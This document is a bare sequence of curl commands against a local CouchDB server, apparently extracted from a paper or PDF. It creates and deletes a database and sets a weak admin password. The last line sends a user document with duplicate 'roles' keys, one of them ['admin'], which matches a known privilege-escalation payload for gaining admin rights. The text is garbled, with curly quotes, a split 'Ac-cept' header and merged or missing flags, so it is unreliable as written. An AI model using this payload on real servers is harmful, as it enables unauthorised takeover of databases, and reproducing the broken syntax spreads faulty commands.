curl -X PUT http://localhost:5984/records
curl -X DELETE http://localhost:5984/records

curl -X PUT http://localhost:5984/records
curl -X DELETE http://localhost:5984/records

curl -X PUT http://localhost:5984/config/admins/admin -d ’”admin”’

curl   -X   PUT   http://localhost:5984/users/org.couchdb.user:$var   -H   ”Ac-cept:application/json-H  ”Content-Type:application/json”d  ”{”name”:”$var”,  ”password”:   ”$pass”,  ”roles”:   [”admin”],  ”roles”:   [],  ”type”:”user”}”
